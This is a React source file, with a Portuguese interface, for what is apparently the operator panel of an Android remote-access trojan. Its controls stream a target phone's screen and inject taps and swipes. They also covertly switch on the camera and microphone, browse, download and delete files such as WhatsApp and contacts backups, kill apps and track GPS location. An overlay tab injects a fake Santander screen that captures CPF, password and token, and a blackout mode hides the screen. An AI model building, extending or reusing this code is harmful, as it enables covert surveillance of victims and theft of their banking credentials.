import { useState, useEffect, useRef } from "react";
import { Panel, PanelHeader } from "@/components/layout";
import { useSocket } from "@/hooks/use-socket";

const G = "#00ff88";
const DIM = "#1a3a20";

type Tool = "screen" | "camera" | "mic" | "files" | "apps" | "location" | "overlay";

interface Props {
  device: any;
  onBack: () => void;
}

function ToolBtn({ icon, label, active, onClick }: { icon: string; label: string; active: boolean; onClick: () => void }) {
  return (
    <button
      onClick={onClick}
      style={{
        background: active ? G : "#020e05",
        color: active ? "#000" : G,
        border: `1px solid ${active ? G : DIM}`,
        padding: "8px 6px",
        cursor: "pointer",
        fontFamily: "inherit",
        fontSize: 9,
        fontWeight: "bold",
        letterSpacing: "0.08em",
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        gap: 4,
        flex: 1,
        transition: "all 0.1s",
        boxShadow: active ? `0 0 10px ${G}44` : "none",
      }}
    >
      <span style={{ fontSize: 18 }}>{icon}</span>
      {label}
    </button>
  );
}

function QualityBar({ value, onChange }: { value: number; onChange: (v: number) => void }) {
  return (
    <div style={{ display: "flex", gap: 4, alignItems: "center" }}>
      <span style={{ fontSize: 8, color: "#445", letterSpacing: "0.08em" }}>QUALIDADE:</span>
      {[10, 20, 30, 70, 100].map((q) => (
        <button
          key={q}
          onClick={() => onChange(q)}
          style={{
            background: value === q ? G : "transparent",
            color: value === q ? "#000" : "#445",
            border: `1px solid ${value === q ? G : "#223"}`,
            fontSize: 8,
            padding: "1px 5px",
            cursor: "pointer",
            fontFamily: "inherit",
            fontWeight: "bold",
          }}
        >
          {q}%
        </button>
      ))}
    </div>
  );
}

function LiveScreen({ device, socket }: { device: any; socket: any }) {
  const [quality, setQuality] = useState(30);
  const [streaming, setStreaming] = useState(false);
  const [frame, setFrame] = useState<string | null>(null);
  const [fps, setFps] = useState(0);
  const [cursor, setCursor] = useState<{ x: number; y: number; visible: boolean }>({ x: 0, y: 0, visible: false });
  const [clickFx, setClickFx] = useState<{ x: number; y: number; id: number } | null>(null);
  const [dragStart, setDragStart] = useState<{ x: number; y: number } | null>(null);
  const screenRef = useRef<HTMLDivElement>(null);
  const frameTimes = useRef<number[]>([]);
  const clickIdRef = useRef(0);

  useEffect(() => {
    const handle = (data: { deviceId: number; frame: string }) => {
      if (data.deviceId === device.id) {
        setFrame(data.frame);
        const now = Date.now();
        frameTimes.current.push(now);
        frameTimes.current = frameTimes.current.filter((t: number) => now - t < 1000);
        setFps(frameTimes.current.length);
      }
    };
    socket.on("stream:frame", handle);
    return () => { socket.off("stream:frame", handle); };
  }, [socket, device.id]);

  const toggle = () => {
    if (!streaming) {
      socket.emit("command:send", { deviceId: device.id, command: `screen:start:${quality}` });
    } else {
      socket.emit("command:send", { deviceId: device.id, command: "screen:stop" });
      setFrame(null);
      setFps(0);
    }
    setStreaming(!streaming);
  };

  const toLocalCoords = (e: React.MouseEvent<HTMLDivElement>) => {
    const rect = screenRef.current?.getBoundingClientRect();
    if (!rect) return { x: 0, y: 0, px: 0, py: 0 };
    const x = e.clientX - rect.left;
    const y = e.clientY - rect.top;
    return {
      x,
      y,
      px: Math.max(0, Math.min(1, x / rect.width)),
      py: Math.max(0, Math.min(1, y / rect.height)),
    };
  };

  const onMove = (e: React.MouseEvent<HTMLDivElement>) => {
    const { x, y } = toLocalCoords(e);
    setCursor({ x, y, visible: true });
  };

  const onDown = (e: React.MouseEvent<HTMLDivElement>) => {
    if (!streaming) return;
    const { px, py } = toLocalCoords(e);
    setDragStart({ x: px, y: py });
  };

  const onUp = (e: React.MouseEvent<HTMLDivElement>) => {
    if (!streaming) return;
    const { x, y, px, py } = toLocalCoords(e);
    if (dragStart) {
      const dx = px - dragStart.x;
      const dy = py - dragStart.y;
      const dist = Math.hypot(dx, dy);
      if (dist > 0.04) {
        socket.emit("command:send", {
          deviceId: device.id,
          command: `touch:swipe:${dragStart.x.toFixed(4)}:${dragStart.y.toFixed(4)}:${px.toFixed(4)}:${py.toFixed(4)}`,
        });
      } else {
        socket.emit("command:send", {
          deviceId: device.id,
          command: `touch:tap:${px.toFixed(4)}:${py.toFixed(4)}`,
        });
        const id = ++clickIdRef.current;
        setClickFx({ x, y, id });
        setTimeout(() => setClickFx((c) => (c?.id === id ? null : c)), 500);
      }
    }
    setDragStart(null);
  };

  return (
    <div>
      <div style={{ display: "flex", gap: 10, alignItems: "center", marginBottom: 10, flexWrap: "wrap" }}>
        <QualityBar value={quality} onChange={(q) => { setQuality(q); if (streaming) socket.emit("command:send", { deviceId: device.id, command: `screen:quality:${q}` }); }} />
        <button
          onClick={toggle}
          style={{
            background: streaming ? "#1a0000" : G,
            color: streaming ? "#ff4444" : "#000",
            border: `1px solid ${streaming ? "#ff4444" : G}`,
            fontSize: 9,
            padding: "3px 12px",
            cursor: "pointer",
            fontFamily: "inherit",
            fontWeight: "bold",
            letterSpacing: "0.1em",
          }}
        >
          {streaming ? "[ PARAR ]" : "[ INICIAR STREAM ]"}
        </button>
        {streaming && (
          <span style={{ fontSize: 9, color: fps > 0 ? G : "#664", letterSpacing: "0.1em" }}>
            {fps} FPS
          </span>
        )}
        {streaming && (
          <span style={{ fontSize: 8, color: "#445", letterSpacing: "0.08em" }}>
            ▸ CLIQUE = TAP • ARRASTE = SWIPE
          </span>
        )}
      </div>
      <div
        ref={screenRef}
        onMouseMove={onMove}
        onMouseLeave={() => setCursor((c) => ({ ...c, visible: false }))}
        onMouseDown={onDown}
        onMouseUp={onUp}
        style={{
          width: "100%",
          aspectRatio: "9/16",
          maxHeight: 400,
          background: "#000",
          border: `1px solid ${streaming ? G : DIM}`,
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
          position: "relative",
          overflow: "hidden",
          cursor: streaming ? "none" : "default",
          userSelect: "none",
        }}
      >
        {frame ? (
          <img src={`data:image/jpeg;base64,${frame}`} alt="stream" draggable={false} style={{ width: "100%", height: "100%", objectFit: "contain", pointerEvents: "none" }} />
        ) : (
          <div style={{ color: "#334", fontSize: 10, textAlign: "center" }}>
            {streaming ? <><span className="blink" style={{ color: G }}>●</span> AGUARDANDO FRAME...</> : "> STREAM INATIVO"}
          </div>
        )}
        {streaming && (
          <div style={{ position: "absolute", top: 6, right: 8, fontSize: 8, color: "#ff3333", display: "flex", alignItems: "center", gap: 4, pointerEvents: "none" }}>
            <span className="blink">●</span> AO VIVO
          </div>
        )}

        {/* Virtual cursor overlay */}
        {streaming && cursor.visible && (
          <div
            style={{
              position: "absolute",
              left: cursor.x,
              top: cursor.y,
              width: 24,
              height: 24,
              marginLeft: -12,
              marginTop: -12,
              pointerEvents: "none",
              zIndex: 5,
            }}
          >
            <div style={{ position: "absolute", left: 11, top: 0, width: 2, height: 24, background: G, boxShadow: `0 0 6px ${G}` }} />
            <div style={{ position: "absolute", left: 0, top: 11, width: 24, height: 2, background: G, boxShadow: `0 0 6px ${G}` }} />
            <div style={{ position: "absolute", left: 9, top: 9, width: 6, height: 6, border: `1px solid ${G}`, borderRadius: "50%", background: "transparent" }} />
          </div>
        )}

        {/* Click ripple */}
        {streaming && clickFx && (
          <div
            key={clickFx.id}
            style={{
              position: "absolute",
              left: clickFx.x,
              top: clickFx.y,
              width: 40,
              height: 40,
              marginLeft: -20,
              marginTop: -20,
              border: `2px solid ${G}`,
              borderRadius: "50%",
              pointerEvents: "none",
              animation: "tapRipple 0.5s ease-out forwards",
              zIndex: 6,
            }}
          />
        )}

        {/* Drag preview line */}
        {streaming && dragStart && cursor.visible && screenRef.current && (
          <svg
            style={{ position: "absolute", inset: 0, pointerEvents: "none", zIndex: 5 }}
            width="100%"
            height="100%"
          >
            <line
              x1={dragStart.x * screenRef.current.getBoundingClientRect().width}
              y1={dragStart.y * screenRef.current.getBoundingClientRect().height}
              x2={cursor.x}
              y2={cursor.y}
              stroke={G}
              strokeWidth={2}
              strokeDasharray="4 3"
              opacity={0.8}
            />
          </svg>
        )}
      </div>

      <style>{`@keyframes tapRipple { from { transform: scale(0.4); opacity: 1; } to { transform: scale(1.6); opacity: 0; } }`}</style>
    </div>
  );
}

function CameraView({ device, socket }: { device: any; socket: any }) {
  const [camType, setCamType] = useState<"front" | "back">("front");
  const [active, setActive] = useState(false);
  const [frame, setFrame] = useState<string | null>(null);

  useEffect(() => {
    const handle = (data: { deviceId: number; frame: string }) => {
      if (data.deviceId === device.id) setFrame(data.frame);
    };
    socket.on("camera:frame", handle);
    return () => { socket.off("camera:frame", handle); };
  }, [socket, device.id]);

  const toggle = () => {
    if (!active) {
      socket.emit("command:send", { deviceId: device.id, command: `camera:start:${camType}` });
    } else {
      socket.emit("command:send", { deviceId: device.id, command: "camera:stop" });
      setFrame(null);
    }
    setActive(!active);
  };

  return (
    <div>
      <div style={{ display: "flex", gap: 8, marginBottom: 10, alignItems: "center" }}>
        {(["front", "back"] as const).map((c) => (
          <button
            key={c}
            onClick={() => { setCamType(c); if (active) socket.emit("command:send", { deviceId: device.id, command: `camera:switch:${c}` }); }}
            style={{
              background: camType === c ? G : "transparent",
              color: camType === c ? "#000" : "#445",
              border: `1px solid ${camType === c ? G : "#223"}`,
              fontSize: 9,
              padding: "3px 10px",
              cursor: "pointer",
              fontFamily: "inherit",
              fontWeight: "bold",
            }}
          >
            {c === "front" ? "📷 FRONTAL" : "📷 TRASEIRA"}
          </button>
        ))}
        <button
          onClick={toggle}
          style={{
            background: active ? "#1a0000" : G,
            color: active ? "#ff4444" : "#000",
            border: `1px solid ${active ? "#ff4444" : G}`,
            fontSize: 9,
            padding: "3px 12px",
            cursor: "pointer",
            fontFamily: "inherit",
            fontWeight: "bold",
          }}
        >
          {active ? "[ PARAR ]" : "[ ATIVAR CÂMERA ]"}
        </button>
      </div>
      <div
        style={{
          width: "100%",
          aspectRatio: "4/3",
          background: "#000",
          border: `1px solid ${active ? G : DIM}`,
          display: "flex",
          alignItems: "center",
          justifyContent: "center",
        }}
      >
        {frame ? (
          <img src={`data:image/jpeg;base64,${frame}`} alt="camera" style={{ width: "100%", height: "100%", objectFit: "cover" }} />
        ) : (
          <div style={{ color: "#334", fontSize: 10 }}>{active ? <><span className="blink" style={{ color: G }}>●</span> AGUARDANDO...</> : "> CÂMERA INATIVA"}</div>
        )}
      </div>
    </div>
  );
}

function MicView({ device, socket }: { device: any; socket: any }) {
  const [active, setActive] = useState(false);
  const [bars] = useState(() => Array.from({ length: 20 }, () => Math.random()));

  const toggle = () => {
    socket.emit("command:send", { deviceId: device.id, command: active ? "mic:stop" : "mic:start" });
    setActive(!active);
  };

  return (
    <div style={{ textAlign: "center", padding: 20 }}>
      <div style={{ marginBottom: 20 }}>
        <div style={{ fontSize: 48, marginBottom: 12 }}>🎙️</div>
        <div style={{ fontSize: 12, color: active ? G : "#445", letterSpacing: "0.2em", marginBottom: 16 }}>
          {active ? "ESCUTA ATIVA" : "MICROFONE INATIVO"}
        </div>
        {active && (
          <div style={{ display: "flex", gap: 3, justifyContent: "center", alignItems: "flex-end", height: 40, marginBottom: 16 }}>
            {bars.map((_, i) => (
              <div
                key={i}
                className="mic-bar"
                style={{
                  width: 4,
                  background: G,
                  borderRadius: 2,
                  animation: `micPulse ${0.3 + Math.random() * 0.5}s ease-in-out infinite alternate`,
                  height: `${20 + Math.random() * 80}%`,
                  boxShadow: `0 0 6px ${G}`,
                }}
              />
            ))}
          </div>
        )}
      </div>
      <button
        onClick={toggle}
        style={{
          background: active ? "#1a0000" : G,
          color: active ? "#ff4444" : "#000",
          border: `2px solid ${active ? "#ff4444" : G}`,
          fontSize: 11,
          padding: "10px 24px",
          cursor: "pointer",
          fontFamily: "inherit",
          fontWeight: "bold",
          letterSpacing: "0.15em",
          boxShadow: active ? "none" : `0 0 15px ${G}44`,
        }}
      >
        {active ? "[ PARAR ESCUTA ]" : "[ INICIAR ESCUTA ]"}
      </button>
    </div>
  );
}

function FilesView({ device, socket }: { device: any; socket: any }) {
  const [path, setPath] = useState("/sdcard");
  const [files] = useState([
    { name: "DCIM", type: "dir", size: "" },
    { name: "Download", type: "dir", size: "" },
    { name: "WhatsApp", type: "dir", size: "" },
    { name: "Documents", type: "dir", size: "" },
    { name: "screenshot_001.png", type: "file", size: "2.1 MB" },
    { name: "recording.mp4", type: "file", size: "14.7 MB" },
    { name: "contacts_backup.vcf", type: "file", size: "48 KB" },
  ]);

  const browse = (name: string) => {
    setPath(`${path}/${name}`);
    socket.emit("command:send", { deviceId: device.id, command: `files:list:${path}/${name}` });
  };

  return (
    <div>
      <div style={{ display: "flex", alignItems: "center", gap: 8, marginBottom: 10 }}>
        <button
          onClick={() => setPath(path.split("/").slice(0, -1).join("/") || "/")}
          style={{ background: "transparent", border: `1px solid ${DIM}`, color: G, fontSize: 9, padding: "3px 8px", cursor: "pointer", fontFamily: "inherit" }}
        >
          ◀ VOLTAR
        </button>
        <div style={{ flex: 1, background: "#020e05", border: `1px solid ${DIM}`, color: G, fontSize: 9, padding: "3px 8px" }}>
          {path}
        </div>
      </div>
      <div style={{ border: `1px solid ${DIM}`, background: "#010801" }}>
        {files.map((f) => (
          <div
            key={f.name}
            style={{
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              padding: "5px 10px",
              borderBottom: "1px solid #0a160c",
              cursor: f.type === "dir" ? "pointer" : "default",
              fontSize: 10,
            }}
            onMouseEnter={(e) => { e.currentTarget.style.background = "#051208"; }}
            onMouseLeave={(e) => { e.currentTarget.style.background = "transparent"; }}
            onDoubleClick={() => { if (f.type === "dir") browse(f.name); }}
          >
            <div style={{ display: "flex", alignItems: "center", gap: 8 }}>
              <span style={{ fontSize: 14 }}>{f.type === "dir" ? "📁" : "📄"}</span>
              <span style={{ color: f.type === "dir" ? "#44aaff" : G }}>{f.name}</span>
              {f.size && <span style={{ color: "#445", fontSize: 8 }}>{f.size}</span>}
            </div>
            <div style={{ display: "flex", gap: 4 }}>
              {f.type === "file" && (
                <button
                  onClick={() => socket.emit("command:send", { deviceId: device.id, command: `files:download:${path}/${f.name}` })}
                  style={{ background: "transparent", border: `1px solid ${DIM}`, color: G, fontSize: 7, padding: "1px 5px", cursor: "pointer", fontFamily: "inherit" }}
                >
                  ↓ DL
                </button>
              )}
              <button
                onClick={() => socket.emit("command:send", { deviceId: device.id, command: `files:delete:${path}/${f.name}` })}
                style={{ background: "transparent", border: "1px solid #332", color: "#ff4444", fontSize: 7, padding: "1px 5px", cursor: "pointer", fontFamily: "inherit" }}
              >
                ✕ DEL
              </button>
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

function AppsView({ device, socket }: { device: any; socket: any }) {
  const [apps, setApps] = useState<any[]>([]);

  useEffect(() => {
    const handle = (data: { deviceId: number; apps?: any[] }) => {
      if (data.deviceId === device.id) setApps(Array.isArray(data.apps) ? data.apps : []);
    };
    socket.on("get_apps", handle);
    return () => { socket.off("get_apps", handle); };
  }, [socket, device.id]);

  useEffect(() => {
    socket.emit("get_apps", { deviceId: device.id });
  }, [socket, device.id]);

  return (
    <div>
      <div style={{ fontSize: 8, color: "#445", marginBottom: 8 }}>{apps.length} APPS INSTALADOS</div>
      <div style={{ border: `1px solid ${DIM}`, background: "#010801" }}>
        {apps.map((app) => (
          <div
            key={app.package}
            style={{
              display: "flex",
              alignItems: "center",
              justifyContent: "space-between",
              padding: "6px 10px",
              borderBottom: "1px solid #0a160c",
              fontSize: 10,
            }}
          >
            <div>
              <div style={{ color: G, fontWeight: "bold" }}>{app.name}</div>
              <div style={{ color: "#334", fontSize: 8 }}>{app.package}</div>
            </div>
            <div style={{ display: "flex", gap: 5, alignItems: "center" }}>
              {app.running && (
                <span style={{ fontSize: 7, color: G, border: `1px solid ${G}44`, padding: "1px 4px" }}>●ATIVO</span>
              )}
              <button
                onClick={() => socket.emit("command:send", { deviceId: device.id, command: `app:open:${app.package}` })}
                style={{ background: "transparent", border: `1px solid ${DIM}`, color: G, fontSize: 7, padding: "2px 6px", cursor: "pointer", fontFamily: "inherit" }}
              >
                ▶ ABRIR
              </button>
              {app.running && (
                <button
                  onClick={() => socket.emit("command:send", { deviceId: device.id, command: `app:kill:${app.package}` })}
                  style={{ background: "transparent", border: "1px solid #332", color: "#ff4444", fontSize: 7, padding: "2px 6px", cursor: "pointer", fontFamily: "inherit" }}
                >
                  ✕ MATAR
                </button>
              )}
            </div>
          </div>
        ))}
      </div>
    </div>
  );
}

function LocationView({ device, socket }: { device: any; socket: any }) {
  const [tracking, setTracking] = useState(false);
  const [coords, setCoords] = useState<{ lat: number; lng: number; acc: number } | null>(null);

  useEffect(() => {
    const handle = (data: { deviceId: number; lat: number; lng: number; accuracy: number }) => {
      if (data.deviceId === device.id) setCoords({ lat: data.lat, lng: data.lng, acc: data.accuracy });
    };
    socket.on("device:location", handle);
    return () => { socket.off("device:location", handle); };
  }, [socket, device.id]);

  const toggle = () => {
    socket.emit("command:send", { deviceId: device.id, command: tracking ? "location:stop" : "location:start" });
    setTracking(!tracking);
  };

  return (
    <div>
      <div style={{ display: "flex", gap: 10, marginBottom: 10, alignItems: "center" }}>
        <button
          onClick={toggle}
          style={{
            background: tracking ? "#1a0000" : G,
            color: tracking ? "#ff4444" : "#000",
            border: `1px solid ${tracking ? "#ff4444" : G}`,
            fontSize: 9,
            padding: "4px 14px",
            cursor: "pointer",
            fontFamily: "inherit",
            fontWeight: "bold",
          }}
        >
          {tracking ? "[ PARAR RASTREIO ]" : "[ INICIAR RASTREIO GPS ]"}
        </button>
        {coords && (
          <div style={{ fontSize: 9, color: G }}>
            📍 {coords.lat.toFixed(6)}, {coords.lng.toFixed(6)} ±{coords.acc}m
          </div>
        )}
      </div>

      <div style={{ width: "100%", height: 300, background: "#010d03", border: `1px solid ${DIM}`, display: "flex", alignItems: "center", justifyContent: "center", flexDirection: "column", gap: 12, position: "relative", overflow: "hidden" }}>
        {coords ? (
          <>
            <div style={{ fontSize: 32, zIndex: 1 }}>📍</div>
            <div style={{ color: G, fontSize: 10, zIndex: 1 }}>{coords.lat.toFixed(6)}, {coords.lng.toFixed(6)}</div>
            <div style={{ color: "#445", fontSize: 8, zIndex: 1 }}>Precisão: ±{coords.acc}m</div>
            <a href={`https://maps.google.com/?q=${coords.lat},${coords.lng}`} target="_blank" rel="noopener noreferrer" style={{ color: G, fontSize: 9, border: `1px solid ${G}`, padding: "3px 10px", textDecoration: "none", zIndex: 1 }}>
              [ VER NO GOOGLE MAPS ]
            </a>
          </>
        ) : (
          <div style={{ color: "#334", fontSize: 10 }}>{tracking ? <><span className="blink" style={{ color: G }}>●</span> AGUARDANDO SINAL GPS...</> : "> RASTREIO GPS INATIVO"}</div>
        )}
      </div>
    </div>
  );
}

function OverlayView({ device, socket }: { device: any; socket: any }) {
  const send = (cmd: string) => socket.emit("command:send", { deviceId: device.id, command: cmd });

  return (
    <div>
      <div style={{ fontSize: 8, color: "#445", marginBottom: 12, letterSpacing: "0.08em" }}>
        SELECIONE O TEMPLATE DE OVERLAY PARA INJETAR NO DISPOSITIVO ALVO
      </div>
      <div style={{ display: "grid", gridTemplateColumns: "1fr 1fr", gap: 10, marginBottom: 10 }}>
        <button onClick={() => send("overlay:santander")} style={{ background: "#0a0000", border: "2px solid #ec0000", color: "#ec0000", padding: "16px 10px", cursor: "pointer", fontFamily: "inherit", fontSize: 10, fontWeight: "bold", letterSpacing: "0.12em", display: "flex", flexDirection: "column", alignItems: "center", gap: 6, transition: "all 0.15s" }}>
          <span style={{ fontSize: 24 }}>🏦</span>
          <span style={{ color: "#ec0000" }}>SANTANDER</span>
          <span style={{ fontSize: 7, color: "#664444" }}>Captura CPF + Senha + Token</span>
        </button>
        <button onClick={() => send("overlay:blackout")} style={{ background: "#050505", border: "2px solid #333", color: "#888", padding: "16px 10px", cursor: "pointer", fontFamily: "inherit", fontSize: 10, fontWeight: "bold", letterSpacing: "0.12em", display: "flex", flexDirection: "column", alignItems: "center", gap: 6, transition: "all 0.15s" }}>
          <span style={{ fontSize: 24 }}>⬛</span>
          <span>BLACKOUT MODE</span>
          <span style={{ fontSize: 7, color: "#445" }}>Tela preta total (#000000)</span>
        </button>
        <button onClick={() => send("overlay:remove")} style={{ background: "transparent", border: `1px solid ${DIM}`, color: "#445", padding: "10px", cursor: "pointer", fontFamily: "inherit", fontSize: 9, letterSpacing: "0.1em", gridColumn: "span 2" }}>
          [ REMOVER OVERLAY ]
        </button>
      </div>
      <Panel style={{ borderColor: "#ec000044" }}>
        <PanelHeader>
          <span>&gt; OVERLAY PREVIEW</span>
          <span style={{ color: "#664444" }}>BLOQUEIO</span>
        </PanelHeader>
        <div style={{ padding: 20, textAlign: "center", color: "#8a0000", background: "#020202", fontSize: 10 }}>
          Pré-visualização do overlay selecionado.
        </div>
      </Panel>
    </div>
  );
}

export default function DeviceTools({ device, onBack }: Props) {
  const socket = useSocket();
  const [activeTool, setActiveTool] = useState<Tool>("screen");

  const send = (cmd: string) => socket.emit("command:send", { deviceId: device.id, command: cmd });

  return (
    <div className="panel" style={{ display: "flex", flexDirection: "column", minHeight: "100%", overflow: "hidden" }}>
      <PanelHeader>
        <button onClick={onBack} style={{ background: "transparent", border: "none", color: G, cursor: "pointer", fontFamily: "inherit", fontSize: 8, letterSpacing: "0.1em" }}>[ VOLTAR ]</button>
        <span style={{ color: "#445", fontSize: 8 }}>{device.name}</span>
      </PanelHeader>
      <div style={{ display: "grid", gridTemplateColumns: "repeat(7, 1fr)", gap: 4, padding: 4 }}>
        <ToolBtn icon="🖥️" label="TELA" active={activeTool === "screen"} onClick={() => setActiveTool("screen")} />
        <ToolBtn icon="📷" label="CÂMERA" active={activeTool === "camera"} onClick={() => setActiveTool("camera")} />
        <ToolBtn icon="🎙️" label="MIC" active={activeTool === "mic"} onClick={() => setActiveTool("mic")} />
        <ToolBtn icon="📁" label="ARQUIVOS" active={activeTool === "files"} onClick={() => setActiveTool("files")} />
        <ToolBtn icon="📦" label="APPS" active={activeTool === "apps"} onClick={() => setActiveTool("apps")} />
        <ToolBtn icon="📍" label="GPS" active={activeTool === "location"} onClick={() => setActiveTool("location")} />
        <ToolBtn icon="⛶" label="OVERLAY" active={activeTool === "overlay"} onClick={() => setActiveTool("overlay")} />
      </div>
      <div style={{ padding: 8, overflow: "auto", flex: 1 }}>
        {activeTool === "screen" && <LiveScreen device={device} socket={socket} />}
        {activeTool === "camera" && <CameraView device={device} socket={socket} />}
        {activeTool === "mic" && <MicView device={device} socket={socket} />}
        {activeTool === "files" && <FilesView device={device} socket={socket} />}
        {activeTool === "apps" && <AppsView device={device} socket={socket} />}
        {activeTool === "location" && <LocationView device={device} socket={socket} />}
        {activeTool === "overlay" && <OverlayView device={device} socket={socket} />}
      </div>
    </div>
  );
}
